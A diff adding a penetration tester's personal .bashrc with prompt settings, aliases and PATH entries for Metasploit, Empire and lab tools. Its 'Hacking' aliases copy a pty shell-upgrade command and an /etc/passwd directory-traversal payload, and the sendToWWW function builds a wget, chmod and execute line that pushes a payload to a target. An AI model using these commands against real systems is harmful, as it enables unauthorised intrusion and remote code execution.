@@ -1,0 +1,372 @@
+# ---------------------------------------------------------------------------
+# Copyright[2019][Joel Leagues aka Scourge]
+# Scourge /at\ protonmail /dot\ com
+# www.Radicalware.com
+# https://www.youtube.com/channel/UCivwmYxoOdDT3GmDnD0CfQA/playlists
+#
+# Licensed under the Apache License, Version 2.0 (the "License");
+# you may not use this file except in compliance with the License.
+# You may obtain a copy of the License at
+#
+# http ://www.apache.org/licenses/LICENSE-2.0
+#
+# Unless required by applicable law or agreed to in writing, software
+# distributed under the License is distributed on an "AS IS" BASIS,
+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+# See the License for the specific language governing permissions and
+# limitations under the License.
+# ---------------------------------------------------------------------------
+
+
+# ~/.bashrc: executed by bash(1) for non-login shells.
+# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
+# for examples
+
+# enable control-s and control-q
+stty -ixon
+
+# If not running interactively, don't do anything
+case $- in
+    *i*) ;;
+      *) return;;
+esac
+
+# don't put duplicate lines or lines starting with space in the history.
+# See bash(1) for more options
+HISTCONTROL=ignoreboth
+
+# append to the history file, don't overwrite it
+shopt -s histappend
+
+# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
+HISTSIZE=1000
+HISTFILESIZE=2000
+
+# check the window size after each command and, if necessary,
+# update the values of LINES and COLUMNS.
+shopt -s checkwinsize
+
+# If set, the pattern "**" used in a pathname expansion context will
+# match all files and zero or more directories and subdirectories.
+#shopt -s globstar
+
+# make less more friendly for non-text input files, see lesspipe(1)
+#[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"
+
+# set variable identifying the chroot you work in (used in the prompt below)
+if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
+    debian_chroot=$(cat /etc/debian_chroot)
+fi
+
+# set a fancy prompt (non-color, unless we know we "want" color)
+case "$TERM" in
+    xterm-color) color_prompt=yes;;
+esac
+
+# uncomment for a colored prompt, if the terminal has the capability; turned
+# off by default to not distract the user: the focus in a terminal window
+# should be on the output of commands, not on the prompt
+force_color_prompt=yes
+
+if [ -n "$force_color_prompt" ]; then
+    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
+	# We have color support; assume it's compliant with Ecma-48
+	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
+	# a case would tend to support setf rather than setaf.)
+	color_prompt=yes
+    else
+	color_prompt=
+    fi
+fi
+
+if [ "$color_prompt" = yes ]; then
+    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
+else
+    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
+fi
+unset color_prompt force_color_prompt
+
+# If this is an xterm set the title to user@host:dir
+case "$TERM" in
+xterm*|rxvt*)
+    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
+    ;;
+*)
+    ;;
+esac
+
+# enable color support of ls and also add handy aliases
+if [ -x /usr/bin/dircolors ]; then
+    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
+    alias ls='ls --color=auto'
+    alias dir='dir --color=auto'
+    alias vdir='vdir --color=auto'
+
+    alias grep='grep --color=auto'
+    alias fgrep='fgrep --color=auto'
+    alias egrep='egrep --color=auto'
+fi
+
+# some more ls aliases
+#alias ll='ls -l'
+#alias la='ls -A'
+#alias l='ls -CF'
+
+# Alias definitions.
+# You may want to put all your additions into a separate file like
+# ~/.bash_aliases, instead of adding them here directly.
+# See /usr/share/doc/bash-doc/examples in the bash-doc package.
+
+if [ -f ~/.bash_aliases ]; then
+    . ~/.bash_aliases
+fi
+
+# enable programmable completion features (you don't need to enable
+# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
+# sources /etc/bash.bashrc).
+if ! shopt -oq posix; then
+  if [ -f /usr/share/bash-completion/bash_completion ]; then
+    . /usr/share/bash-completion/bash_completion
+  elif [ -f /etc/bash_completion ]; then
+    . /etc/bash_completion
+  fi
+fi
+
+
+source /etc/profile.d/bash_completion.sh
+
+#export PS1="\[\033[1;31m\]\u\[\033[m\]@\[\033[1;31m\]\h:\[\033[33;1m\]\w\[\033[m\]\$\n"
+
+
+# "u" is your username
+# "h" is your hostname
+# "@" and "$" are literals
+# so are "[" or "]" with no \ in front
+
+export PS1="\[\033[1;31m\][\[\033[33;1m\]\w\[\033[31;1m\]]\[\033[m\]\n\[\033[1;31m\]\u\[\033[m\]@\[\033[1;31m\]\h:\[\033[31;1m\]\$\[\033[1;m\] "
+export CLICOLOR=1
+export LS_COLORS="di=1;36:ln=35:so=32:pi=33:ex=1;32:bd=34;46:cd=34;43:su=30;41:sg=30;46:tw=30;42:ow=30;43"
+
+
+# ===================== EXTRACT ========================================
+
+### Extract file, example. "exx package.tar.bz2"
+### By Sandra Henry-Stocker
+exx() {
+    if [[ -f $1 ]]; then
+        case $1 in
+            *.tar.bz2) tar xjf $1 ; echo 'tar -xjf $1';;
+            *.tar.gz) tar xvzf $1 ; echo 'tar -xvzf $1';;
+            *.bz2) bunzip2 $1 ; echo 'bunzip2 $1';;
+            *.gz) gunzip $1 ; echo 'gunzip $1';;
+            *.tar) tar xf $1 ; echo 'tar -xf $1';;
+            *.tbz2) tar xjf $1 ; echo 'tar -xjf $1';;
+            *.tgz) tar xzf $1 ; echo 'tar -xzf $1';;
+            *.zip) unzip $1 ; echo 'unzip $1';;
+            *.Z) uncompress $1 ; echo 'uncompress $1';;
+            *.7z) 7z x $1 ; echo '7z -z $1';;
+            *.deb) dpkg -i $1; echo 'dpkg -i $1';;
+	    	*.rar) unrar x $1; echo 'unrar x $1';;
+            *) echo $1 cannot be extracted ;;
+        esac
+    else
+        echo $1 is not a valid file
+    fi
+}
+# ===================== Scripts ======================================
+
+cleanEnvironmentalVariables(){ 
+	bad_vars=$($@)
+	for var in $bad_vars; do
+		alias $var="echo |tr -d \"\n\"" > /dev/null
+	done
+	x=$(); # clear the standard var
+}
+
+nt(){ # name terminal tab
+	if [ -z $1 ]; then
+		echo "nt <new name>"
+	else
+		echo "PROMPT_COMMAND=\"echo -en \\\"\033]0;$1\a\\\"\"; clear" | xsel -b
+		echo "PROMPT_COMMAND=\"echo -en \\\"\033]0;$1\a\\\"\"" 
+	fi
+}
+
+sendToWWW(){ 
+	x=$();
+	if [ -z "$2" ]; then
+		echo "send_to_apache2 <file> <new_filename>"
+	else
+		cp $1 /var/www/html/$2
+		locations=$(ifconfig | grep inet | grep -v -e inet6 -e 127 | cut -d' ' -f10)
+		for loc in $locations; do
+			x=$(echo -e "wget $loc/$2" && echo "$x")
+		done
+		x=$(echo "rm $2 >/dev/null" && echo "$x" && echo "chmod +x \"$2\"" && echo "./$2")
+		echo "$x" | xsel -b
+		echo -e "Copied\n$x\nto clipboard!!"
+	fi
+	ce # clean environment variable
+}
+
+clipShellcode(){ 
+	x=$(xsel -b | tr -d "\n" | sed 's/""//g; s/;//g')
+	echo "$x"
+	echo "$x" | tr -d '\n' | xsel -b
+	ce
+}
+
+updateBashrc(){ 
+
+	if [[ $EUID -eq 0 ]]; then
+		# update root's BashRC
+		cp /home/Scourge/.bashrc /root/.bashrc
+
+		# execute the bashrc
+		. /root/.bashrc
+		. /home/Scourge/.bashrc
+
+		# chown the bashrc_copy
+		cp /home/Scourge/.bashrc /home/Scourge/Documents/bashrc_copy
+		chown Scourge:Scourge /home/Scourge/Documents/bashrc_copy
+	else
+		. ~/.bashrc
+	fi
+	# this adds all the aliases to a file for bash script use
+	cat ~/.bashrc | grep -E "^alias" > ~/.bash_aliases
+	# shopt -s expand_aliases
+	# source ~/.bash_aliases
+}
+
+# ===================== PATHS ========================================
+
+export PATH="/opt/Radicalware/Applications/Build/Release":$PATH
+
+export PATH="/bin":$PATH
+export PATH="/sbin":$PATH
+
+export PATH="/bin":$PATH
+export PATH="/sbin":$PATH
+
+export PATH="/usr/sbin":$PATH
+export PATH="/usr/share":$PATH
+
+export PATH="/usr/local/include":$PATH
+export PATH="/usr/local/lib":$PATH
+
+export PATH="/sxp":$PATH
+export PATH="/sxp/make":$PATH
+export PATH="/sxp/hacking":$PATH
+export PATH="/sxp/network":$PATH
+export PATH="/sxp/os":$PATH
+export PATH="/sxp/blue":$PATH
+export PATH="/sxp/git":$PATH
+export PATH="/sxp/shared_folder":$PATH
+export PATH="/sxp/compile":$PATH
+export PATH="/sxp/msf":$PATH
+export PATH="/sxp/sql":$PATH
+export PATH="/sxp/file_ctrl":$PATH
+export PATH="/sxp/ssh":$PATH
+export PATH="/sxp/system/osx":$PATH
+export PATH="/sxp/system/linux":$PATH
+export PATH="/sxp/finding/":$PATH
+export PATH="/sxp/ctf/pwk":$PATH
+export PATH="/sxp/rcpp/bin":$PATH
+export PATH="/sxp/servers":$PATH
+
+export PATH="/sxp/git/win_to_git/bin":$PATH
+export PATH="/sxp/git/win_update":$PATH
+export PATH="/sxp/git/au":$PATH
+
+export PATH="/home/Scourge/lp/Postman":$PATH
+export PATH="/home/Scourge/lp/arachni/bin":$PATH
+export PATH="/home/Scourge/lp/metasploit-framework":$PATH
+export PATH="/home/Scourge/lp/empire":$PATH
+export PATH="/home/Scourge/lp/enum4linux":$PATH
+
+export PATH="/opt/apache-maven-3.5.0/bin/":$PATH
+export PATH="/opt/exploit-database":$PATH
+
+export PATH="/usr/lib/jvm/java-8-openjdk-amd64":$PATH
+export PATH="/usr/lib/jvm/java-8-openjdk-amd64/bin":$PATH
+
+export PATH="/usr/lib/gcc/x86_64-linux-gnu/7":$PATH
+
+# ===================== VARS =========================================
+
+# startup paths
+# /bin && /sbin
+# all others
+# /usr/bin && /usr/sbin
+
+export ipl="10.11.0.129"
+export ipw="10.11.6.83"
+export   a="10.11.1" # mane sure none of your bashrc vars = an alias
+
+# -I /usr/local/include to the compiler as preprocessor flag,
+# -L /usr/local/lib to the compiler as linker flag
+
+# Library Path for Source Code
+export LIBRARY_PATH="/usr/local/include":$LIBRARY_PATH
+export LIBRARY_PATH="/opt/Radicalware/Libraries/Include":$LIBRARY_PATH
+export LIBRARY_PATH="/opt/Radicalware/Libraries/Projects":$LIBRARY_PATH
+
+export CPATH="/opt/Radicalware/Libraries/Include":$CPATH
+export CPATH="/opt/Radicalware/Libraries/Projects":$CPATH
+
+export LD_LIBRARY_PATH="/opt/Radicalware/Libraries/Build/Release/bin":$LD_LIBRARY_PATH
+export LD_RUN_PATH="/opt/Radicalware/Libraries/Build/Release/bin":$LD_RUN_PATH
+
+# ===================== ALIAS ========================================
+
+# The Usuals 
+alias s="sudo"
+alias c="clear"
+alias C="clear"
+alias l="ls -v"
+alias ll="ls -lv"
+alias p="ls ~/programs"
+alias o="cat"
+alias e="echo -e"
+alias pg="echo \"Google Ping Results\"; ping -c 1 google.com | grep -E 'received|packet loss'"
+
+# Piping Usual Data
+alias g="grep -IiE --color=auto"
+alias v="grep -Eiv"
+alias m="more"
+alias lineCount="wc -l"
+alias numGrep="grep -o '^[0-9]*'"
+
+# Developer
+alias g64="x86_64-linux-gnu-gcc"
+alias devnull="echo ' > /dev/null 2>&1' | tr -d '\n'| xsel -b && echo 'copied!'"
+
+# xPlatform
+alias type="cat"
+alias move="mv"
+alias cls="clear"
+alias del="rm"
+
+# Hacking
+alias vbsDownload="cat ~/programs/vbs_download.txt | xsel -b ;echo Copied!"
+alias shell="echo \"python -c 'import pty;pty.spawn(\\\"/bin/bash\\\")'\" | xsel -b; echo Copied!"
+alias clipDirTraversal='echo "../../../../../../../../../../../etc/passwd" | xsel -b; echo "Copied!"'
+alias nmapGrep="grep -viE 'Nmap done|Starting Nmap|Nmap scan report|Host is up' | sed '/^$/d;s/PORT/\nPORT/g'"
+
+# Start Services
+alias startApache='service apache2 start; service apache2 status'
+alias startPostgresql='service postgresql start; service postgresql status'
+
+# Restart Services
+alias restartServers="service apache2 stop; service mysql stop ; /opt/apache-tomcat-7/bin/shutdown.sh; service apache2 start; service mysql start; /opt/apache-tomcat-7/bin/startup.sh"
+alias restartApacheMysql="service apache2 stop; service mysql stop; service apache2 start; service mysql start"
+alias restartApache='service apache2 restart; service apache2 status'
+alias restartPostgresql='service postgresql restart; service postgresql status'
+
+alias restartNetwork='sudo systemctl restart NetworkManager.service'
+
+# Service Status
+alias statSql="service mysql status"
+alias statApache="service apache2 status"
+
+# ====================================================================
